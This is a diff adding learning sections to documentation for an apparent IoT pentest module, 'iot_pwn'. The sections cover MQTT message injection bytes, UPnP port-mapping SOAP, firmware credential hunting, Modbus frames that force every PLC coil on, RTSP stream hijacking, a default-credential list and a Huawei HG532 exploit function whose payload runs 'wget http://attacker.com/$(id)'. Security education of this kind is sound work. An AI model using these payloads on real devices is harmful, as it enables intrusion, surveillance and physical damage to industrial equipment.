@@ -661,6 +661,13 @@ footer { border-top: 1px solid var(--border); margin-top: 2rem; }
         <li><div class="sidebar-sep">More</div></li>
         <li><a href="#dependencies">Dependencies</a></li>
         <li><a href="#examples">Examples</a></li>
+        <li><div class="sidebar-sep">Deep Dive</div></li>
+        <li><a href="#iot-arch">IoT Architecture</a></li>
+        <li><a href="#mqtt-bytes">MQTT Internals</a></li>
+        <li><a href="#firmware-analysis">Firmware Analysis</a></li>
+        <li><a href="#modbus-bytes">Modbus/ICS Bytes</a></li>
+        <li><a href="#iot-customization">Customization</a></li>
+        <li><a href="#iot-learning">Learning Path</a></li>
         <li><div class="sidebar-sep">Modules</div></li>
         <li><a href="netrecon.html">netrecon</a></li>
         <li><a href="android_pentest.html">android_pentest</a></li>
@@ -672,6 +679,47 @@ footer { border-top: 1px solid var(--border); margin-top: 2rem; }
     <div class="content">
 
       <!-- Overview -->
+            <!-- ═══════════════════════════════════════════════════════
+           BEGINNER STARTUP — read foundations.html first
+           ═══════════════════════════════════════════════════════ -->
+      <div id="beginner-startup" style="background:linear-gradient(135deg,#0d2018,#111a15);border:2px solid rgba(74,222,128,0.35);border-radius:12px;padding:1.6rem 2rem;margin-bottom:2.5rem">
+        <div style="display:flex;align-items:center;gap:0.8rem;margin-bottom:1rem">
+          <div style="width:32px;height:32px;background:#1a4a2e;border:1px solid rgba(74,222,128,0.4);border-radius:7px;display:flex;align-items:center;justify-content:center;flex-shrink:0">
+            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="2"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>
+          </div>
+          <div>
+            <div style="font-size:0.48rem;letter-spacing:0.22em;text-transform:uppercase;color:rgba(74,222,128,0.7)">Beginner Startup</div>
+            <div style="font-size:0.72rem;font-weight:700;color:#f0ede6">New to secV or iot_pwn? Start here.</div>
+          </div>
+          <a href="../foundations.html" style="margin-left:auto;font-size:0.52rem;color:#4ade80;text-decoration:none;border:1px solid rgba(74,222,128,0.35);padding:0.3rem 0.7rem;border-radius:5px;white-space:nowrap" onmouseover="this.style.background='rgba(74,222,128,0.1)'" onmouseout="this.style.background='transparent'">Foundations guide &rarr;</a>
+        </div>
+        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:0.8rem;margin-bottom:1.2rem">
+          <div style="background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:0.9rem 1rem">
+            <div style="font-size:0.54rem;font-weight:700;color:#f0ede6;margin-bottom:0.4rem">What you need first</div>
+            <ul style="list-style:none;font-size:0.58rem;color:#666;line-height:1.9"><li>▸ IoT device(s) on your network (router, camera, smart switch)</li>
+<li>▸ nmap installed: <code>pacman -S nmap</code></li>
+<li>▸ <code>mosquitto-clients</code> for MQTT: <code>pacman -S mosquitto</code></li></ul>
+          </div>
+          <div style="background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:0.9rem 1rem">
+            <div style="font-size:0.54rem;font-weight:700;color:#f0ede6;margin-bottom:0.4rem">Your first safe command</div>
+            <pre style="font-size:0.58rem;color:#9a9a9a;line-height:1.7;margin:0;white-space:pre-wrap">set target 192.168.1.0/24
+set operation scan
+run</pre>
+          </div>
+          <div style="background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.06);border-radius:8px;padding:0.9rem 1rem">
+            <div style="font-size:0.54rem;font-weight:700;color:#f0ede6;margin-bottom:0.4rem">Operations by difficulty</div>
+            <ul style="list-style:none;font-size:0.58rem;color:#666;line-height:1.9">
+              <li><span style="color:#4ade80">&bull;</span> <strong style="color:#bbb">Easy:</strong> scan, default_creds, banner_grab</li>
+              <li><span style="color:#fbbf24">&bull;</span> <strong style="color:#bbb">Medium:</strong> mqtt_probe, rtsp_stream, firmware_pull</li>
+              <li><span style="color:#f87171">&bull;</span> <strong style="color:#bbb">Advanced:</strong> modbus_exploit, upnp_inject, custom_payload</li>
+            </ul>
+          </div>
+        </div>
+        <div style="font-size:0.58rem;color:#555;border-top:1px solid rgba(255,255,255,0.06);padding-top:0.8rem">
+          <strong style="color:#888">Key terms:</strong> <a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">IoT</a> — Internet of Things — networked embedded devices (cameras, sensors, routers) &nbsp;·&nbsp; <a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">MQTT</a> — Lightweight IoT messaging protocol, often unauthenticated on internal networks &nbsp;·&nbsp; <a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">RTSP</a> — Real Time Streaming Protocol — used by IP cameras for live video &nbsp;·&nbsp; <a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">Shodan</a> — Search engine for internet-exposed devices and services
+          &nbsp;&mdash;&nbsp;<a href="../foundations.html#glossary" style="color:#4ade80;text-decoration:none">Full glossary &rarr;</a>
+        </div>
+      </div>
       <section id="overview">
         <p class="sec-label">Overview</p>
         <h2>What iot_pwn does</h2>
@@ -1098,6 +1146,540 @@ run 10.0.1.1</code></pre>
 set threads 50
 set timeout 5
 run 192.168.0.1</code></pre>
+      </section>
+
+
+
+      <!-- ═══════════════════════════════════════════════════════════
+           IoT ARCHITECTURE DEEP DIVE
+      ════════════════════════════════════════════════════════════════ -->
+      <section id="iot-arch">
+        <h2>IoT Architecture Deep Dive</h2>
+        <p>Before you can attack an IoT device you need to understand what it is. An <strong>Internet of Things</strong> device is an embedded computer — usually running a stripped-down Linux kernel on a MIPS, ARM, or x86 SoC — that controls a physical thing: a router, camera, smart plug, industrial controller, or sensor. Unlike a server it has no keyboard, limited RAM (8–256 MB), and often ships with factory credentials that owners never change.</p>
+
+        <h3>The IoT software stack</h3>
+        <pre><code>┌─────────────────────────────────────────────┐
+│  Application layer — busybox httpd, dropbear │  ← your target
+│  (Telnet server, web UI, MQTT broker, etc.)  │
+├─────────────────────────────────────────────┤
+│  Middleware — uClibc / musl, dbus, wpa_supplicant│
+├─────────────────────────────────────────────┤
+│  Linux kernel (2.6–5.x) on MIPS/ARM/x86    │
+├─────────────────────────────────────────────┤
+│  Bootloader — U-Boot, CFE, GRUB             │
+├─────────────────────────────────────────────┤
+│  Flash (NAND/NOR) — firmware image          │
+│  SoC — Broadcom BCM63xx, MediaTek MT7620,   │
+│          Qualcomm IPQ40xx, Realtek RTL8197   │
+└─────────────────────────────────────────────┘</code></pre>
+
+        <h3>Attack surface categories</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Surface</th><th>Interface</th><th>iot_pwn module</th></tr></thead>
+            <tbody>
+              <tr><td>Remote management</td><td>Telnet :23, SSH :22, HTTP :80/:8080</td><td>default_creds, banner_grab</td></tr>
+              <tr><td>Media streaming</td><td>RTSP :554</td><td>rtsp_stream</td></tr>
+              <tr><td>Messaging bus</td><td>MQTT :1883 (clear), :8883 (TLS)</td><td>mqtt_probe</td></tr>
+              <tr><td>Discovery</td><td>UPnP SSDP :1900 UDP, mDNS :5353 UDP</td><td>upnp_inject</td></tr>
+              <tr><td>Industrial protocols</td><td>Modbus/TCP :502, DNP3 :20000</td><td>modbus_exploit</td></tr>
+              <tr><td>Update mechanism</td><td>HTTP firmware pull (unsigned)</td><td>firmware_pull</td></tr>
+              <tr><td>Physical debug</td><td>UART 3.3V serial, JTAG</td><td>manual (not automated)</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Physical debug: UART and JTAG</h3>
+        <p>Most IoT routers have a 3.3V UART port on the PCB. Connect a USB-to-UART adapter (CP2102 / CH340), find the TX/RX/GND pads with a multimeter, and you get a root shell at U-Boot before the OS boots. JTAG exposes full CPU state including memory dump — useful for extracting firmware when the web interface is locked.</p>
+        <pre><code>screen /dev/ttyUSB0 115200     # attach to UART console
+# Hit Ctrl+C at U-Boot prompt to stop autoboot
+# Then: run bootcmd or tftp-boot custom kernel</code></pre>
+
+        <h3>iot_pwn architecture (Python)</h3>
+        <pre><code>iot_pwn.py
+├── main(json_input)          # secV entry point — reads JSON params
+├── scan_target()             # nmap --open on IoT port list
+├── credential_modules/
+│   ├── try_telnet(ip, user, pwd, timeout)  # socket + telnetlib
+│   ├── try_ssh(ip, user, pwd)              # paramiko.SSHClient
+│   ├── try_ftp(ip, user, pwd)              # ftplib.FTP
+│   └── try_http(ip, user, pwd)             # requests.Session + form POST
+├── protocol_modules/
+│   ├── mqtt_probe(ip, port)   # paho-mqtt subscribe #
+│   ├── rtsp_stream(ip)        # OPTIONS / DESCRIBE RTSP/1.0
+│   ├── upnp_inject(ip)        # SSDP M-SEARCH + SUBSCRIBE
+│   └── modbus_exploit(ip)     # raw TCP socket Modbus frames
+└── analysis/
+    ├── banner_grab(ip)        # nc-style read first 512 bytes
+    ├── snmp_walk(ip)          # pysnmp GetNext OID 1.3.6.1
+    └── firmware_pull(url)     # requests.get + binwalk</code></pre>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════════════════
+           MQTT PROTOCOL INTERNALS
+      ════════════════════════════════════════════════════════════════ -->
+      <section id="mqtt-bytes">
+        <h2>MQTT Protocol Internals</h2>
+        <p><strong>What is MQTT?</strong> MQTT (Message Queuing Telemetry Transport) is a publish-subscribe messaging protocol designed for constrained devices. A central <em>broker</em> receives messages from <em>publishers</em> and delivers them to <em>subscribers</em> who have registered interest in a <em>topic</em>. Every IoT sensor, smart bulb, and industrial sensor is likely talking MQTT. Mosquitto is the most common broker; cloud IoT platforms (AWS IoT Core, Azure IoT Hub) use MQTT over TLS.</p>
+        <p>Default port: <strong>1883</strong> (plaintext). TLS: <strong>8883</strong>. WebSocket: <strong>9001</strong>.</p>
+
+        <h3>MQTT packet structure</h3>
+        <pre><code>┌──────────────────────────────────────────────┐
+│  Fixed Header (1–5 bytes)                    │
+│  ┌────────────┬────────────┐                 │
+│  │ Control (1B)│ Remaining │                 │
+│  │ [Type|Flags]│ Length    │                 │
+│  └────────────┴────────────┘                 │
+│  Variable Header (type-specific)             │
+│  Payload                                     │
+└──────────────────────────────────────────────┘
+
+Control byte (first byte):
+  Bits 7-4: Packet type
+  Bits 3-0: Flags (type-dependent)
+
+Packet types:
+  0x10 = CONNECT      0x20 = CONNACK
+  0x30 = PUBLISH      0x40 = PUBACK
+  0x82 = SUBSCRIBE    0x90 = SUBACK
+  0xC0 = PINGREQ      0xD0 = PINGRESP
+  0xE0 = DISCONNECT</code></pre>
+
+        <h3>CONNECT packet bytes (unauthenticated broker)</h3>
+        <pre><code>10 1F                  # CONNECT, remaining length = 31
+00 04 4D 51 54 54      # Protocol Name: "MQTT" (length-prefixed)
+04                     # Protocol Level: 4 (MQTT 3.1.1)
+02                     # Connect Flags: Clean Session bit set
+00 3C                  # Keep Alive: 60 seconds
+00 08                  # Client ID length: 8
+68 61 63 6B 74 6F 6F 6C # Client ID: "hacktool"
+
+# If broker has no auth → CONNACK:
+20 02 00 00            # CONNACK, length=2, no session, accepted (0x00)</code></pre>
+
+        <h3>SUBSCRIBE to all topics (wildcard)</h3>
+        <pre><code>82 09                  # SUBSCRIBE, remaining length = 9
+00 01                  # Packet Identifier = 1
+00 01 23               # Topic "#" (length=1, char 0x23 = '#')
+00                     # QoS 0
+
+# Topic wildcards:
+#   #  = match everything (e.g. subscribe to ALL messages)
+#   +  = single level (e.g. home/+/temperature)
+#   /  = level separator
+
+# iot_pwn does this to harvest all traffic from an open broker</code></pre>
+
+        <h3>PUBLISH — injecting a message</h3>
+        <pre><code># Publish "PWNED" to topic "home/light/switch"
+30 1E                         # PUBLISH, QoS 0, no retain
+00 12                         # Topic length = 18
+68 6F 6D 65 2F 6C 69 67 68 74 2F 73 77 69 74 63 68
+                              # "home/light/switch"
+50 57 4E 45 44                # Payload: "PWNED"
+
+# Real attack: publish {"state":"ON"} to control a smart plug
+# or publish malformed JSON to crash the firmware parser</code></pre>
+
+        <h3>Attack scenarios</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Attack</th><th>Method</th><th>Impact</th></tr></thead>
+            <tbody>
+              <tr><td>Topic enumeration</td><td>SUBSCRIBE # on open broker</td><td>Harvest all sensor data, credentials in topics</td></tr>
+              <tr><td>Message injection</td><td>PUBLISH to actuator topic</td><td>Control lights, locks, industrial relays</td></tr>
+              <tr><td>Broker takeover</td><td>Admin credentials → $SYS/config topics</td><td>Reroute all messages, DoS the broker</td></tr>
+              <tr><td>MQTT-over-WebSocket</td><td>Bypass firewall — port 9001</td><td>Access broker from web browser context</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>UPnP SSDP discovery bytes</h3>
+        <p>UPnP uses SSDP (Simple Service Discovery Protocol) — a UDP multicast protocol on 239.255.255.250:1900. iot_pwn sends an M-SEARCH to enumerate all UPnP devices on the subnet, then probes each device's XML descriptor for control URLs that accept SOAP action messages.</p>
+        <pre><code># M-SEARCH request (UDP → 239.255.255.250:1900)
+M-SEARCH * HTTP/1.1\r\n
+Host: 239.255.255.250:1900\r\n
+Man: "ssdp:discover"\r\n
+ST: ssdp:all\r\n
+MX: 3\r\n
+\r\n
+
+# Device responds with XML descriptor URL, e.g.:
+#   LOCATION: http://192.168.1.1:1780/rootDesc.xml
+
+# SOAP action to add port mapping (IGD — Internet Gateway Device):
+POST /upnp/control/WANIPConn1 HTTP/1.1
+SOAPAction: "urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping"
+&lt;s:Envelope&gt;...&lt;NewExternalPort&gt;9999&lt;/NewExternalPort&gt;
+  &lt;NewProtocol&gt;TCP&lt;/NewProtocol&gt;
+  &lt;NewInternalClient&gt;192.168.1.100&lt;/NewInternalClient&gt;...
+# → Router forwards port 9999 from WAN → attacker's machine</code></pre>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════════════════
+           FIRMWARE ANALYSIS
+      ════════════════════════════════════════════════════════════════ -->
+      <section id="firmware-analysis">
+        <h2>Firmware Analysis</h2>
+        <p><strong>What is firmware?</strong> Firmware is the operating system and application code burned into a device's flash memory. It's a binary blob containing: a compressed Linux kernel, a root filesystem (usually SquashFS or JFFS2), bootloader config, and sometimes hardcoded credentials, private TLS keys, and backdoor accounts left in by manufacturers.</p>
+
+        <h3>Firmware file layout (typical router)</h3>
+        <pre><code>Offset   Length   Content
+0x0000   4        Magic bytes identifying format
+                  Trx: "HDR0" (48 44 52 00)
+                  Squashfs: "sqsh" (73 71 73 68)
+                  gzip: 1F 8B 08 ...
+                  uImage: 27 05 19 56
+
+0x0000   0x40     TRX header (Linksys/Broadcom):
+  [MAGIC 4B][CRC32 4B][version 2B][flags 2B]
+  [partition offsets × 3]
+
+After header:
+  [compressed kernel — gzip/lzma]
+  [root filesystem — SquashFS/JFFS2]</code></pre>
+
+        <h3>Extracting with binwalk</h3>
+        <pre><code>binwalk firmware.bin          # signatures scan
+binwalk -e firmware.bin       # extract known formats
+binwalk -Me firmware.bin      # recursive extraction (matryoshka)
+
+# After extraction, root filesystem is in _firmware.bin.extracted/
+ls _firmware.bin.extracted/squashfs-root/
+# etc/  bin/  usr/  lib/  www/  ...
+
+# Hunt for credentials
+grep -r "admin\|password\|passwd\|secret" squashfs-root/etc/
+grep -r "BEGIN RSA\|BEGIN EC" squashfs-root/  # embedded private keys
+
+# Check for backdoor accounts
+cat squashfs-root/etc/passwd
+cat squashfs-root/etc/shadow  # if present, crack with hashcat</code></pre>
+
+        <h3>Common findings in firmware</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Finding</th><th>Location</th><th>Impact</th></tr></thead>
+            <tbody>
+              <tr><td>Hardcoded creds</td><td>/etc/passwd, /etc/config/, web UI source</td><td>Full device access</td></tr>
+              <tr><td>Embedded TLS cert+key</td><td>/etc/ssl/, /etc/certs/</td><td>HTTPS MITM, impersonate device</td></tr>
+              <tr><td>Debug backdoor</td><td>Telnetd started if magic UDP packet seen</td><td>Persistent root shell</td></tr>
+              <tr><td>Unsigned upgrade</td><td>HTTP fetch + flash write, no signature check</td><td>Persistent firmware implant</td></tr>
+              <tr><td>Stale packages</td><td>uClibc 0.9.33, OpenSSL 0.9.8</td><td>Known CVEs (Heartbleed, etc.)</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>iot_pwn firmware_pull operation</h3>
+        <pre><code># 1. Identify update URL from device web UI (common paths)
+GET /cgi-bin/fwupdate.cgi
+GET /upgrade.cgi
+GET /admin/firmware.asp
+
+# 2. iot_pwn fetches the firmware binary
+use iot_pwn
+set operation firmware_pull
+set firmware_url http://192.168.1.1/firmware_dump
+run 192.168.1.1
+
+# 3. Output: saved to loot/firmware_&lt;ip&gt;_&lt;timestamp&gt;.bin
+# 4. Manually analyze with binwalk</code></pre>
+
+        <h3>JFFS2 and SquashFS filesystems</h3>
+        <pre><code># SquashFS magic: 73 71 73 68 (sqsh)
+# Block-compressed read-only FS — used for root in most routers
+unsquashfs squashfs-root.bin   # extract to squashfs-root/
+
+# JFFS2 magic: 19 85 (little-endian node magic)
+# Writable journalling FS — used for /overlay, /etc in OpenWRT
+jefferson jffs2.bin -d output/ # extract JFFS2
+
+# YAFFS2 — NAND flash FS, magic varies per device
+# Common on older Android devices and Huawei routers</code></pre>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════════════════
+           MODBUS / ICS INTERNALS
+      ════════════════════════════════════════════════════════════════ -->
+      <section id="modbus-bytes">
+        <h2>Modbus / ICS Protocol Bytes</h2>
+        <p><strong>What is Modbus?</strong> Modbus is a serial communication protocol from 1979 now running over TCP (port 502). It is the dominant protocol in industrial control systems (ICS/SCADA): PLCs, RTUs, HMIs, power meters, HVAC controllers. Modbus has <strong>zero authentication</strong> — any device on the network can read sensor values or write actuator commands.</p>
+
+        <h3>Modbus/TCP frame format</h3>
+        <pre><code>┌────────────────────────────────────────────────────────┐
+│ MBAP Header (7 bytes)                                  │
+│  Transaction ID  [2B] — echo'd back in response        │
+│  Protocol ID     [2B] — always 00 00 for Modbus        │
+│  Length          [2B] — bytes following this field     │
+│  Unit ID         [1B] — slave/device ID (0xFF = any)  │
+├────────────────────────────────────────────────────────┤
+│ PDU (Protocol Data Unit)                               │
+│  Function Code   [1B]                                  │
+│  Data            [variable]                            │
+└────────────────────────────────────────────────────────┘</code></pre>
+
+        <h3>Function codes and attack payloads</h3>
+        <pre><code>FC 01 (Read Coils) — read output relay states
+  Request:  00 01 00 00 00 06 FF  01 00 00 00 10
+            ──────────────────── ── ─────  ─────
+            MBAP (txid=1)        FC start  count=16
+
+FC 03 (Read Holding Registers) — read sensor/config values
+  Request:  00 02 00 00 00 06 FF  03 00 00 00 0A
+  # Read 10 registers starting at 0x0000
+
+FC 06 (Write Single Register) — set a value
+  Request:  00 03 00 00 00 06 FF  06 00 01 00 64
+            ──────────────────── ── ─────  ─────
+            MBAP                 FC addr=1 value=100
+
+FC 0F (Write Multiple Coils) — force ALL coils ON
+  Request:  00 04 00 00 00 09 FF  0F 00 00 00 08 01 FF
+  # Sets 8 coils starting at 0x0000, all to 1 (ON)
+
+# iot_pwn modbus_exploit sends FC 0F to set all outputs HIGH
+# On a physical PLC this can open valves, trip circuit breakers</code></pre>
+
+        <h3>RTSP stream hijacking bytes</h3>
+        <pre><code># RTSP (Real Time Streaming Protocol) — IP cameras
+OPTIONS rtsp://192.168.1.100:554/ RTSP/1.0\r\n
+CSeq: 1\r\n
+\r\n
+
+# Response includes methods: OPTIONS DESCRIBE SETUP PLAY TEARDOWN
+
+DESCRIBE rtsp://192.168.1.100:554/live RTSP/1.0\r\n
+CSeq: 2\r\n
+Accept: application/sdp\r\n
+\r\n
+
+# Response: SDP (Session Description Protocol) body
+# Shows: codec (H.264), track URLs, timing
+
+SETUP rtsp://192.168.1.100:554/live/track1 RTSP/1.0\r\n
+CSeq: 3\r\n
+Transport: RTP/AVP;unicast;client_port=9000-9001\r\n
+\r\n
+
+PLAY rtsp://192.168.1.100:554/live RTSP/1.0\r\n
+CSeq: 4\r\n
+Session: &lt;session-id-from-setup&gt;\r\n
+\r\n
+# RTP video packets now stream to UDP port 9000
+# View with: vlc rtsp://192.168.1.100:554/live</code></pre>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════════════════
+           CUSTOMIZATION
+      ════════════════════════════════════════════════════════════════ -->
+      <section id="iot-customization">
+        <h2>Customization &amp; Extension</h2>
+        <p>iot_pwn is built to be extended. Every protocol module is a self-contained function. You can add custom credential lists, new protocol scanners, or plug in your own CVE exploit code.</p>
+
+        <h3>Adding a custom credential list</h3>
+        <pre><code># tools/network/iot_pwn/iot_pwn.py
+
+# Default credential list (top 30 IoT defaults)
+DEFAULT_CREDS = [
+    ("admin", "admin"), ("admin", "password"), ("admin", "1234"),
+    ("root", "root"), ("root", ""), ("admin", ""),
+    ("user", "user"), ("support", "support"),
+    # ... more defaults
+]
+
+# Extend with your own list loaded from file
+def load_custom_creds(path):
+    creds = []
+    with open(path) as f:
+        for line in f:
+            user, _, pwd = line.strip().partition(":")
+            creds.append((user, pwd))
+    return creds
+
+# In main():
+if params.get("cred_file"):
+    creds = load_custom_creds(params["cred_file"])
+else:
+    creds = DEFAULT_CREDS</code></pre>
+
+        <h3>Adding a custom protocol scanner</h3>
+        <pre><code"># Add CoAP (Constrained Application Protocol) scanner
+# CoAP is like HTTP for IoT — runs on UDP:5683
+
+import socket, struct
+
+def coap_discover(ip, port=5683):
+    """Send CoAP GET /.well-known/core to enumerate resources."""
+    # CoAP header: 4 bytes
+    # Ver=1, Type=0 (CON), TKL=0, Code=0.01 (GET), MsgID=1
+    hdr = struct.pack(">BBH", 0x40, 0x01, 0x0001)
+    # Option 11 (Uri-Path): ".well-known"
+    option_wk  = b'\xBB' + b'.well-known'
+    # Option 11 delta=0: "core"
+    option_core = b'\x04' + b'core'
+    pkt = hdr + option_wk + option_core
+
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.settimeout(3)
+    sock.sendto(pkt, (ip, port))
+    try:
+        data, _ = sock.recvfrom(1024)
+        # Parse CoAP response — payload after options
+        return {"coap": True, "resources": data[4:].decode(errors='replace')}
+    except socket.timeout:
+        return {"coap": False}
+
+# Register in module.json:
+# { "name": "coap_discover", "description": "CoAP resource enumeration" }</code></pre>
+
+        <h3>Adding a CVE check</h3>
+        <pre><code># CVE-2017-17215: Huawei HG532 — UPnP RCE
+# POST /ctrlt/DeviceUpgrade_1 with shell metacharacter injection
+
+def cve_2017_17215(ip):
+    import requests
+    url = f"http://{ip}:37215/ctrlt/DeviceUpgrade_1"
+    payload = """&lt;?xml version="1.0" ?&gt;&lt;s:Envelope ...&gt;
+  &lt;NewStatusURL&gt;$(wget http://attacker.com/$(id))&lt;/NewStatusURL&gt;
+  &lt;NewDownloadURL&gt;HUAWEIUPNP&lt;/NewDownloadURL&gt;&lt;/s:Envelope&gt;"""
+    headers = {
+        "Authorization": "Digest username=\"dslf-config\"",
+        "SOAPAction": "urn:schemas-upnp-org:service:WANPPPConnection:1#ForceTermination"
+    }
+    try:
+        r = requests.post(url, data=payload, headers=headers, timeout=5)
+        return r.status_code == 200
+    except Exception:
+        return False
+
+# Add to CVE_CHECKS dict in iot_pwn.py:
+CVE_CHECKS["CVE-2017-17215"] = {
+    "fn": cve_2017_17215,
+    "description": "Huawei HG532 UPnP RCE",
+    "affected": "Huawei HG532 series"
+}</code></pre>
+
+        <h3>Integrating with iot_pwn's output format</h3>
+        <pre><code># All operations must return a dict matching the secV JSON schema:
+{
+  "success": True,
+  "target": "192.168.1.1",
+  "module": "iot_pwn",
+  "operation": "coap_discover",
+  "findings": [
+    {
+      "type": "open_service",
+      "service": "coap",
+      "port": 5683,
+      "details": "Resources: &lt;/sensors/temperature&gt;,&lt;/actuators/relay&gt;"
+    }
+  ],
+  "loot": {
+    "credentials": [],
+    "firmware": None,
+    "cves": []
+  },
+  "duration_s": 1.23
+}</code></pre>
+      </section>
+
+      <!-- ═══════════════════════════════════════════════════════════
+           LEARNING PATH
+      ════════════════════════════════════════════════════════════════ -->
+      <section id="iot-learning">
+        <h2>Learning Path</h2>
+
+        <h3>Recommended resources (free first)</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Resource</th><th>Format</th><th>Focus</th></tr></thead>
+            <tbody>
+              <tr><td><a href="https://tryhackme.com/room/iotbasics" target="_blank">TryHackMe — IoT Basics</a></td><td>Guided lab</td><td>IoT attack surface, Telnet/SSH creds</td></tr>
+              <tr><td><a href="https://owasp.org/www-project-internet-of-things/" target="_blank">OWASP IoT Top 10</a></td><td>Reference</td><td>Security categories with examples</td></tr>
+              <tr><td><a href="https://www.attify.com/iot-security-exploitation-training/" target="_blank">Attify IoT Exploitation</a></td><td>Course</td><td>Firmware extraction, UART, JTAG</td></tr>
+              <tr><td><em>The IoT Hacker's Handbook</em> — Aditya Gupta</td><td>Book</td><td>Comprehensive IoT pentest methodology</td></tr>
+              <tr><td><a href="https://github.com/scriptingxss/owasp-fstm" target="_blank">OWASP FSTM</a></td><td>Reference</td><td>Firmware Security Testing Methodology</td></tr>
+              <tr><td><a href="https://tryhackme.com/room/iotfirmware" target="_blank">TryHackMe — Firmware Analysis</a></td><td>Guided lab</td><td>binwalk, SquashFS, hardcoded creds</td></tr>
+              <tr><td><a href="https://github.com/nicowillis/iot-security-resources" target="_blank">IoT Security Resources</a></td><td>Curated list</td><td>Tools, CVEs, research papers</td></tr>
+              <tr><td><em>Practical IoT Hacking</em> — Fotios Chantzis et al.</td><td>Book</td><td>Radio (BLE/Zigbee/Z-Wave), hardware, protocols</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Hands-on lab environments</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Lab</th><th>Description</th><th>URL</th></tr></thead>
+            <tbody>
+              <tr><td>DVWA-IoT</td><td>Deliberately vulnerable IoT web app</td><td>GitHub: nicowillis/dvwa-iot</td></tr>
+              <tr><td>VulnHub: Damn Vulnerable Router Firmware</td><td>MIPS router firmware image</td><td>vulnhub.com</td></tr>
+              <tr><td>CTF: RHME2</td><td>Hardware CTF with UART/AVR challenges</td><td>riscure.com/challenge</td></tr>
+              <tr><td>Mosquitto broker (local)</td><td>Run a local MQTT broker: <code>docker run -p 1883:1883 eclipse-mosquitto</code></td><td>hub.docker.com</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h3>Practice progression (8 weeks)</h3>
+        <pre><code>Week 1 — Foundations
+  ▸ Read OWASP IoT Top 10
+  ▸ Install mosquitto and mqtt-explorer
+  ▸ Run: docker run -p 1883:1883 eclipse-mosquitto (open broker)
+  ▸ SUBSCRIBE # — see what's flowing
+
+Week 2 — Network scanning
+  ▸ nmap -p 23,22,80,443,554,1883,5683,502 &lt;local_subnet&gt;
+  ▸ iot_pwn scan + banner_grab on every open device
+  ▸ Note firmware version strings from banners
+
+Week 3 — Default credentials
+  ▸ iot_pwn default_creds on your own router
+  ▸ Try Shodan.io query: "default password" + device model
+  ▸ Check RouterPasswords.com + datarecovery.com/rd/default-router-passwords/
+
+Week 4 — Firmware extraction
+  ▸ Download router firmware from manufacturer support page
+  ▸ binwalk -Me firmware.bin
+  ▸ Grep for passwords, certs, API keys
+  ▸ Try: TryHackMe Firmware Analysis room
+
+Week 5 — MQTT attack
+  ▸ Set up Mosquitto with anonymous access
+  ▸ Subscribe # → publish to actuator topics
+  ▸ Try iot_pwn mqtt_probe on your local broker
+  ▸ Capture with Wireshark: filter mqtt
+
+Week 6 — UPnP and RTSP
+  ▸ iot_pwn upnp_inject on your router
+  ▸ Verify port mapping was added with: netstat -rn
+  ▸ If you have an IP camera: iot_pwn rtsp_stream to grab the stream
+  ▸ View RTSP in VLC: Media → Open Network Stream
+
+Week 7 — Modbus/ICS
+  ▸ Run ModRSsim2 (Windows) or PyModbus simulator on Linux
+  ▸ iot_pwn modbus_exploit against simulator
+  ▸ Read: ICS CERT advisories at cisa.gov/ics-advisories
+
+Week 8 — CVE exploitation
+  ▸ Identify router/camera model + firmware version
+  ▸ Search CVE Details or NVD for known vulns
+  ▸ Add a custom CVE check to iot_pwn
+  ▸ Set up VulnHub DVRF to practice binary exploitation on MIPS</code></pre>
+
+        <h3>Key tools</h3>
+        <div class="table-wrap">
+          <table>
+            <thead><tr><th>Tool</th><th>Purpose</th><th>Install</th></tr></thead>
+            <tbody>
+              <tr><td>binwalk</td><td>Firmware analysis and extraction</td><td><code>pacman -S binwalk</code></td></tr>
+              <tr><td>mosquitto-clients</td><td>MQTT publish/subscribe CLI</td><td><code>pacman -S mosquitto</code></td></tr>
+              <tr><td>mqtt-explorer</td><td>GUI MQTT client</td><td>mqtt-explorer.com</td></tr>
+              <tr><td>routersploit</td><td>Framework for router/IoT exploitation</td><td><code>pip install routersploit</code></td></tr>
+              <tr><td>firmwalker</td><td>Post-extraction file analysis</td><td>github.com/craigz28/firmwalker</td></tr>
+              <tr><td>PyModbus</td><td>Modbus/TCP client/server in Python</td><td><code>pip install pymodbus</code></td></tr>
+              <tr><td>Wireshark</td><td>Protocol capture (filter: mqtt, modbus)</td><td><code>pacman -S wireshark-qt</code></td></tr>
+            </tbody>
+          </table>
+        </div>
       </section>
 
     </div><!-- /content -->
